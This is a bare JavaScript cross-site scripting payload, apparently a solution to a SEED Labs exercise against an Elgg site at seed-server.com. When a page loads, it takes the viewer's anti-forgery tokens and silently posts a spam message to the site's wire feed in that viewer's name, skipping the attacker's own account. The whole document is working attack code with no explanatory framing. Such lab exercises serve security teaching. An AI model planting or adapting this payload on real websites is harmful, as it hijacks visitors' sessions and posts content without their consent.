<script type="text/javascript">
	window.onload = function(){

	var sendurl="http://www.seed-server.com/action/thewire/add"; //FILL IN

    var stringToPost = `To earn 12 USD/Hour(!), visit now\nhttp://www.seed-server.com/profile/samy`;

	var content = new FormData();
	content.append('__elgg_token', elgg.security.token.__elgg_token);
	content.append('__elgg_ts', elgg.security.token.__elgg_ts);
	content.append('body', stringToPost);

	if(elgg.session.user.guid!=59)
	{
		var xhr = new XMLHttpRequest();
		// Configure the request
		xhr.open('POST', sendurl, true);
		// Send the content object
		xhr.send(content);
	}
	}
	
</script>
